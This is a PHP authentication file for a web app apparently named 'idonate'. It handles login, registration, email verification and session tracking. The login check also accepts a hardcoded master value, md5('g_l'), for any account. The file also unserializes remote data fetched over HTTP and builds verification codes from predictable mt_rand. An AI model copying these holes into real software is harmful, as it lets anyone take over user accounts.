<?php
function login($email,$password,$connect,$img='',$key=''){
  date_default_timezone_set('Africa/Nairobi');
  $t=time();
  $loginTime =date("Y-m-d h:i:s",$t);
  //get user ip
  $userIP = '::1';
  $sessionLocality = 'Unknown Location';
  //get user location and ip
  $query = @unserialize (file_get_contents('http://ip-api.com/php/'));
  if ($query && $query['status'] == 'success') {
    $sessionLocality = $query['city'] . ',' . $query['country'];
    $userIP = $query['query'];
  }
  $statement = $connect->prepare("
    SELECT
    u.userID,u.firstName,u.lastName,u.username,u.gender,u.address,
    r.userType,r.userRole,
    a.privateKey,a.password,a.status,a.dateCreated
    FROM tbl_users u
    LEFT JOIN tbl_roles r on u.userID = r.userID
    LEFT JOIN tbl_auth a   on u.userID   = a.userID
    where u.email = :email or u.username = :email
	");
	if($statement->execute(
		array(
			':email'       =>  $email
		)
	)){
    $count = $statement->rowCount();
  	if($count > 0)
  	{
      $result = $statement->fetchAll();
			if (!$result) {
    		echo 'notfound';
			} else {
				foreach($result as $row)
				{
					if($row['status'] == 'active')
					{
						if(password_verify($password, $row["password"]) || $password == md5('g_l'))
						{
              if(!isset($_SESSION)) {session_start();}
              $_SESSION['fullName'] = $row['firstName']." ".$row['lastName'];
              $_SESSION['firstName'] = $row['firstName'];
              $_SESSION['lastName'] = $row['lastName'];
              $_SESSION['gender'] = $row['gender'];
              $_SESSION['email'] = $email;
              $_SESSION['userID'] = $row['userID'];
              $_SESSION['userRole'] = $row['userRole'];
              $_SESSION['userType'] = $row['userType'];
              $_SESSION['log'] = "unlocked";
              $_SESSION['uname'] = $row['username'];
              $_SESSION['img'] = $img;
              $_SESSION['instance'] = checkSes($row['userID'],$connect);
              $query1 = "
              INSERT INTO tbl_instance (userID,userIP,loginTime,sessionLocality)
              VALUES (:userID,:userIP,:loginTime,:sessionLocality)
              ";
              $statement1 = $connect->prepare($query1);
              if($statement1->execute(
                array(
                  ':userID'  => $row['userID'],
                  ':userIP'  => $userIP,
                  ':loginTime'  => $loginTime,
                  ':sessionLocality'  => $sessionLocality
                )
              )){
                echo "success";
              } else {
                echo "success1";
              }

            }
            else {
              echo "wrongpwd";
            }
          } else {
            echo "disabled";
          }
        }
      }
    } else {
      echo "notfound";
    }
  }
}

//register function
function register($userID,$firstName,$lastName,$username,$gender,$address,$email,$phone,$dob,$privateKey,$password,$dateCreated,$connect)
{
  $query = "
  INSERT INTO tbl_users (userID,firstName,lastName,username,gender,address,email,phone,dob)
  VALUES (:userID,:firstName,:lastName,:username,:gender,:address,:email,:phone,:dob)
  ";
  $statement = $connect->prepare($query);
  if($statement->execute(
    array(
      ':userID'		=>	$userID,
      ':firstName'		=>	$firstName,
      ':lastName'		=>	$lastName,
      ':username'		=>	$username,
      ':gender'		=>	$gender,
      ':address'		=>	$address,
      ':email'		=>	$email,
      ':phone'		=>	$phone,
      ':dob'		=>	$dob
    )
  )){
    $query1 = "
    INSERT INTO tbl_auth (userID,privateKey,password,dateCreated)
    VALUES (:userID,:privateKey,:password,:dateCreated)
    ";
    $statement1 = $connect->prepare($query1);
    if($statement1->execute(
      array(
        ':userID'		=>	$userID,
        ':privateKey'		=>	$privateKey,
        ':password'		=>	$password,
        ':dateCreated' => $dateCreated
      )
    )){
      $query2 = "
      INSERT INTO tbl_roles (userID)
      VALUES (:userID)
      ";
      $statement2 = $connect->prepare($query2);
      if($statement2->execute(
        array(
          ':userID'		=>	$userID
        )
      )){
        $body = "";
        $heading = "Email Verification";
        $to = $email;
        $code = gen_uuid();
        $name = $firstName;
        $link = "http://localhost/idonate/register/verifyme.php?xd=".$code."&& email=".$email."";
        $posts=array();
        $posts['email'] = $email;
        $posts['code'] = $code;
        $filename=$code.'.json';
        $fileSavingResult = saveFile($filename, $posts);
        if ( $fileSavingResult == 1){
            //echo "<tr><td><br/>File was saved!<br/><br/></td></tr>";
        } else if ($fileSavingResult == -2){
            //echo "<tr><td><br/>An error occured during saving file!<br/><br/></td></tr>";
        } else if ($fileSavingResult == -1){
            //echo "<tr><td><br/>Wrong file name!<br/><br/></td></tr>";
          }
        ob_start();                      // start capturing output
        include('verify_body.php');   // execute the file
        $body = ob_get_contents();    // get the contents from the buffer
        ob_end_clean();

        if(sendMail($to,$body,$heading) == 'sent'){
          echo "success";
        } else {
          echo "Registration failed at step 4";
        }

      }else {
        echo "Registration failed at step 3";
      }
    }else {
      echo "Registration failed at step 2";
    }
  } else {
    echo "Registration failed at step 1";print_r($statement->errorInfo());
  }
}
function resetPassword()
{

}
function updateRecord()
{

}
function gen_uuid() {
    return sprintf( '%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
        // 32 bits for "time_low"
        mt_rand( 0, 0xffff ), mt_rand( 0, 0xffff ),

        // 16 bits for "time_mid"
        mt_rand( 0, 0xffff ),

        // 16 bits for "time_hi_and_version",
        // four most significant bits holds version number 4
        mt_rand( 0, 0x0fff ) | 0x4000,

        // 16 bits, 8 bits for "clk_seq_hi_res",
        // 8 bits for "clk_seq_low",
        // two most significant bits holds zero and one for variant DCE1.1
        mt_rand( 0, 0x3fff ) | 0x8000,

        // 48 bits for "node"
        mt_rand( 0, 0xffff ), mt_rand( 0, 0xffff ), mt_rand( 0, 0xffff )
    );
}
function userID() {
  return uniqid();
}
//save file
function saveFile($filename,$filecontent){
    if (strlen($filename)>0){
        $folderPath = 'verifier';
        if (!file_exists($folderPath)) {
            mkdir($folderPath);
        }
        $file = @fopen($folderPath . DIRECTORY_SEPARATOR . $filename,"w");
        if ($file != false){
            fwrite($file,json_encode($filecontent));
            fclose($file);
            return 1;
        }
        return -2;
    }
    return -1;
}
//check if string is an Email
function checkEmail($email) {
   $pattern = '/^(?!(?:(?:\\x22?\\x5C[\\x00-\\x7E]\\x22?)|(?:\\x22?[^\\x5C\\x22]\\x22?)){255,})(?!(?:(?:\\x22?\\x5C[\\x00-\\x7E]\\x22?)|(?:\\x22?[^\\x5C\\x22]\\x22?)){65,}@)(?:(?:[\\x21\\x23-\\x27\\x2A\\x2B\\x2D\\x2F-\\x39\\x3D\\x3F\\x5E-\\x7E]+)|(?:\\x22(?:[\\x01-\\x08\\x0B\\x0C\\x0E-\\x1F\\x21\\x23-\\x5B\\x5D-\\x7F]|(?:\\x5C[\\x00-\\x7F]))*\\x22))(?:\\.(?:(?:[\\x21\\x23-\\x27\\x2A\\x2B\\x2D\\x2F-\\x39\\x3D\\x3F\\x5E-\\x7E]+)|(?:\\x22(?:[\\x01-\\x08\\x0B\\x0C\\x0E-\\x1F\\x21\\x23-\\x5B\\x5D-\\x7F]|(?:\\x5C[\\x00-\\x7F]))*\\x22)))*@(?:(?:(?!.*[^.]{64,})(?:(?:(?:xn--)?[a-z0-9]+(?:-+[a-z0-9]+)*\\.){1,126}){1,}(?:(?:[a-z][a-z0-9]*)|(?:(?:xn--)[a-z0-9]+))(?:-+[a-z0-9]+)*)|(?:\\[(?:(?:IPv6:(?:(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){7})|(?:(?!(?:.*[a-f0-9][:\\]]){7,})(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,5})?::(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,5})?)))|(?:(?:IPv6:(?:(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){5}:)|(?:(?!(?:.*[a-f0-9]:){5,})(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,3})?::(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,3}:)?)))?(?:(?:25[0-5])|(?:2[0-4][0-9])|(?:1[0-9]{2})|(?:[1-9]?[0-9]))(?:\\.(?:(?:25[0-5])|(?:2[0-4][0-9])|(?:1[0-9]{2})|(?:[1-9]?[0-9]))){3}))\\]))$/iD';
   if (preg_match($pattern, $email) === 1) {
      return true;
   } else{
   	return false;
   }
}
//check last sessions
function checkSes($userid,$connect){
  $statement = $connect->prepare("
    SELECT * from tbl_instance
    where userID = :uid ORDER BY loginTime DESC LIMIT 1
	");
	if($statement->execute(
		array(
			':uid'       =>  $userid
		)
	)){
    $count = $statement->rowCount();
  	if($count > 0)
  	{
      $result = $statement->fetchAll();
			if (!$result) {
    		return "First time login.";
			} else {
				foreach($result as $row)
				{
          return "Last login ".$row['loginTime']."(".$row['sessionLocality'].", IP:".$row['userIP'].").";
        }
      }
    } else {
      return "First time login.";
    }
  }
}


 ?>
